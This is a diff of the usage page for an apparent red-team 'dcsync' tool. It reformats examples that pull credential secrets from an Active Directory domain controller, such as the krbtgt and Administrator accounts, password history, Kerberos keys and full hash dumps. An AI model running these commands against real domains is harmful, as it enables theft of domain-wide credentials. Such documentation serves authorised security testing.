@@ -4,93 +4,91 @@
 
 ## Subcommands / Usage
 
-{% hint style="info" %}
-**Syntax**
+### `General Usage`
 
 ```bash
 ./dcsync [auth_flags] --dc <DC> (-n <name1,name2> | -N <file> | -g <guid> | -s <sid> | -S <sid-file> | -q <ldap-filter> | -a) [--history] [--all eytypes] [--resume-file <file>]
 ```
-{% endhint %}
 
-### Replicate specific accounts by name (comma-separated)
+**Replicate specific accounts by name (comma-separated):**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -n Administrator,krbtgt
 ```
 
-### Replicate accounts listed in a file
+**Replicate accounts listed in a file:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -N targets.txt
 ```
 
-### Replicate a single object by GUID
+**Replicate a single object by GUID:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -g a1b2c3d4-e5f6-7890-abcd-ef1234567890
 ```
 
-### Replicate a single object by SID
+**Replicate a single object by SID:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -s S-1-5-21-111-222-333-502
 ```
 
-### Replicate objects whose SIDs are listed in a file
+**Replicate objects whose SIDs are listed in a file:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -S sids.txt
 ```
 
-### Replicate objects matching an LDAP filter
+**Replicate objects matching an LDAP filter:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -q '(userAccountControl:1.2.840.113556.1.4.803:=512)'
 ```
 
-### Replicate all objects in batches of 1000
+**Replicate all objects in batches of 1000:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a -M 1000
 ```
 
-### Include password history for a specific account
+**Include password history for a specific account:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -n Administrator --history
 ```
 
-### Include all supported Kerberos encryption key types
+**Include all supported Kerberos encryption key types:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -n Administrator --all-keytypes
 ```
 
-### Dump all accounts with account status and password-last-set metadata
+**Dump all accounts with account status and password-last-set metadata:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a --user-status --pwd-last-set
 ```
 
-### Dump all accounts, omitting LM hashes
+**Dump all accounts, omitting LM hashes:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a --no-lm
 ```
 
-### Write output to a directory
+**Write output to a directory:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a -o /tmp/dump
 ```
 
-### Write output to the default output directory
+**Write output to the default output directory:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a -O
 ```
 
-### Resume a previously interrupted dump from a checkpoint file
+**Resume a previously interrupted dump from a checkpoint file:**
 
 ```bash
 ./dcsync [auth_flags] --dc dc01.example.com -a --resume-file output/example.local_1234567890.resume
